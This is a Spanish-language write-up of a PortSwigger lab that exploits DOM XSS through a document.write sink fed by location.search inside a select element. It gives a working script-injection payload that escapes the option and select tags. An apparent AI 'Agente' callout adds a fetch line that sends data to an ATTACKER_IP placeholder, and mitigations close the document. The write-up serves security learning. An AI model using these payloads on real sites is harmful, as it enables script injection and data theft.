---
title: "DOM XSS in document.write sink using source location.search inside a select element"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element"
author: "Z4k7"
date: "2026-04-14"
year: "2026"
status: "pwned"
tags:
  - "Web_Security"
  - "DOM"
techniques:
  - "DOM XSS"
  - "document.write sink"
  - "location.search source"
  - "context escape in select element"
tools:
  - "Browser DevTools"
  - "BurpSuite"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Laboratorio de BurpSuite Academy sobre DOM XSS usando document.write como sink y location.search como source, con la particularidad de que el payload debe escapar de un elemento <select><option>. La vulnerabilidad radica en que JavaScript construye un dropdown basado en parámetros URL sin sanitizar. Cadena de ataque: reconocimiento → identificación del contexto <select> → escape mediante </option> → inyección de payload <script>. Técnica clave: context-aware escaping para salir de elementos anidados."
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios (XSS) basada en DOM en la funcionalidad de verificación de acciones. Utiliza JavaScript `document.write` función que escribe datos en la página dentro de un elemento `<select>`. La función se llama con datos de `location.search` que puedes controlar mediante la URL del sitio web. Los datos están incluidos en un elemento select.
          Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que salga del elemento select y llame al `alert` función.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414195220561.jpg"
        caption: "Inicio del laboratorio"
      - kind: "note"
        text: |
          Ingresando en uno de los artículos contamos con la URL `product?productId=1`. Si ingresamos a consultar el código fuente de la web podemos interactuar con el siguiente script:
      - kind: "code"
        lang: "JS"
        code: |
          <script>
              var stores = ["London","Paris","Milan"];
              var store = (new URLSearchParams(window.location.search)).get('storeId');
                  document.write('<select name="storeId">');
                      if(store) {
                          document.write('<option selected>'+store+'</option>');
                          }
                      for(var i=0;i<stores.length;i++) {
                          if(stores[i] === store) {
                              continue;
                          }
                      document.write('<option>'+stores[i]+'</option>');
                          }
                              document.write('</select>');
          </script>
      - kind: "note"
        text: |
          Consultando el comportamiento del funcionamiento de la web una vez se ingresa en uno de los artículos se genera una consulta `GET`. Una vez se genera la consulta crea una instancia en la URL `productId`. Validando el comportamiento del script esta a la espera de una respuesta de URL en este caso de un atributo adicional `storeId`. Dicho atributo es el encargado de generar el proceso del script.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Observaste bien el patrón: el script toma URLSearchParams de `location.search` y lo inyecta directamente dentro de `document.write()` DENTRO de un contexto HTML (`<select><option>`). Esto es DOM XSS clásico + una capa extra de complejidad: debes escapar NO SOLO del `<select>`, sino también del `<option>` que lo envuelve. Esto es un buen ejemplo de 'context-aware' payload crafting."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Ya contamos con el código que confirma el funcionamiento de la consulta mencionada en el apartado de reconocimiento.
          Validando el comportamiento del funcionamiento de la web al momento de seleccionar una opción de la lista se envía una solicitud GET en este caso con nuevos atributos para la consulta sería `storeId`.
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414204450345.jpg"
        caption: "Comportamiento de consulta GET"
      - kind: "note"
        text: |
          Contamos con los parámetros que requiere la ejecución del script. Si enviamos esa misma solicitud pero por parte del entorno web debe funcionar sin problema alguno de la siguiente manera:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414204611421.jpg"
        caption: "Funcionamiento del dropdown"
      - kind: "note"
        text: |
          Envío de solicitud comportamiento `productId=1&storeId=Paris`
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414204718898.jpg"
        caption: "Solicitud con parámetro valido"
      - kind: "note"
        text: |
          Se esta aplicando la consulta en el DOM. En este caso podríamos tratar de escapar del código modificando el comportamiento del script en el apartado `document.write('<option selected>'+store+'</option>');`
          Si pasamos en la URL `</option>` estaríamos rompiendo el comportamiento obligando al script creer que se ha terminado la etiqueta y rompe la estructura del HTML:
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414205331465.jpg"
        caption: "Prueba de escape de etiqueta option"
      - kind: "note"
        text: |
          Ya cerramos la etiqueta de `</option>`. Si nos permite interactuar con etiquetas es posible ingresar código. En este caso aplicaremos `<script>alert(document.domain)</script>`
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414205643723.jpg"
        caption: "Inyección de payload 1"
      - kind: "image"
        src: "assets/images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/file-20260414205715903.jpg"
        caption: "Inyección de payload 2"
      - kind: "callout"
        type: "warning"
        label: "Contexto Anidado Identificado"
        text: "El payload se construye DENTRO de un elemento `<select>` que contiene `<option>`. El script escribe: `<option selected>PAYLOAD</option>`. Para escapar, necesitas cerrar AMBAS etiquetas antes de inyectar JavaScript."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Excelente metodología: reconociste que el contexto NO era simple HTML, sino HTML anidado (select > option). Eso significa que `<h1>` no funciona, pero tampoco funciona `<script>` si está dentro de `<option selected>`. Necesitabas cerrar la opción primero: `</option></select><script>alert()</script>`. El hecho de que encontraste la solución significa que entiendes la importancia del 'contexto' en XSS — muy senior."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload ejecutable es `</option></select><script>alert(document.domain)</script>` porque:
          1. `</option>` cierra la etiqueta option abierta
          2. `</select>` cierra el dropdown
          3. `<script>alert(document.domain)</script>` inyecta JavaScript que se ejecuta después del dropdown
          De esta manera saltamos del contexto anidado y ejecutamos código JavaScript arbitrario:
          El servidor renderiza:
      - kind: "code"
        lang: "HTML"
        code: |
          <select name="storeId">
              <option selected></option></select><script>alert(document.domain)</script></option>
          </select>
      - kind: "note"
        text: |
          El navegador parsea esto como:
      - kind: "bullet"
        text: "Dropdown abierto"
      - kind: "bullet"
        text: "Opción vacía"
      - kind: "bullet"
        text: "Dropdown cerrado"
      - kind: "bullet"
        text: "Script ejecutable"
      - kind: "bullet"
        text: "Opción cerrada (HTML malformado, pero es ignorado)"
      - kind: "note"
        text: |
          El alert se dispara mostrando el dominio actual.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Es importante notar que aunque el HTML final es malformado (hay `</option>` extra al final), el navegador lo procesa sin error porque el script ya fue ejecutado antes. Esta es una característica de los navegadores modernos: son 'tolerantes' con HTML malformado. En ejecución real de ataque: si quieres exfiltrar datos, harías `fetch('http://ATTACKER_IP/?domain='+document.domain)` en lugar de `alert()`."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          ✅ Lab completado: El payload `</option></select><script>alert(document.domain)</script>` se ejecutó correctamente escapando del contexto anidado `<select><option>` usando `document.write()` con source `location.search`.

lessons:
  - 'DOM XSS es context-aware: No basta con inyectar `<script>`. Debes entender DÓNDE está tu payload dentro del HTML — ¿en un atributo? ¿dentro de una etiqueta? ¿dentro de JavaScript?'
  - 'Anidamiento aumenta complejidad: Cuando tu inyección está dentro de `<select><option>`, debes cerrar AMBAS antes de ejecutar código.'
  - 'Los navegadores son tolerantes: HTML malformado NO impide la ejecución de scripts. Eso es bueno para el atacante, malo para el defensor.'
  - 'URLSearchParams + document.write = garantía de DOM XSS: Menos protección que server-side rendering. Si ves este patrón, busca la vulnerabilidad.'
  - 'La escalación comienza con PoC simple: `alert()` es una prueba. El verdadero ataque es robo de cookies, redirección, inyección de malware.'
mitigation:
  - 'Escape de output según contexto: Usar `textContent` en lugar de `innerHTML/document.write()` cuando sea posible. `textContent` no parsea HTML.'
  - 'Validación de input: Whitelist de valores permitidos en `storeId` (solo "London", "Paris", "Milan"). Rechazar cualquier otra cosa.'
  - 'Content Security Policy (CSP): `script-src ''self''` + `default-src ''self''` bloquearía scripts inyectados.'
  - 'Sanitización con librerías: DOMPurify si necesitas permitir HTML, pero en este caso deberías rechazar HTML completamente.'
  - 'Evitar document.write(): Es deprecated. Usar métodos modernos como `element.textContent = ...` o `element.insertAdjacentHTML()` con sanitización.'
  - 'Validación en servidor: El servidor NUNCA debe confiar en que los valores vienen de su lista predefinida. Validar siempre en backend.'
---
